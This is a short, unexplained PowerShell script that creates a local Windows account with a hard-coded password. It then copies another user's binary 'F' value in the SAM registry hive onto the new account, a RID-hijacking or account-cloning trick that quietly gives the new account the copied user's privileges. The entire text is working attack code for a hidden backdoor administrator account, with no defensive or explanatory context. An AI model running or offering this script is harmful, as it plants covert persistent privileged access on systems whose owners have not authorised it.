
net user sevradmin Passw0rdiestP@ssword /add
$u = 'sevradmin'
$p = ''

$copied = 'target_user'

$usrs = gci HKLM:\sam\SAM\Domains\Account\Users\
$nms = gci HKLM:\sam\SAM\Domains\Account\Users\Names -Name

for ($di=0; $di -le $nms.length; $di++){if ($nms[$di] -eq $u){break}}
for ($si=0; $si -le $nms.length; $si++){if ($nms[$si] -eq $copied){break}}

$st = ([string]((Get-ItemProperty $usrs[$si].name.replace('HKEY_LOCAL_MACHINE\','hklm:')).f | %{$tmp = [convert]::tostring($_,16); if($tmp.length -eq 1){$tmp='0'+$tmp};$tmp})).replace(' ','')

reg add $usrs[$di].name /v f /t REG_BINARY /d $st /f
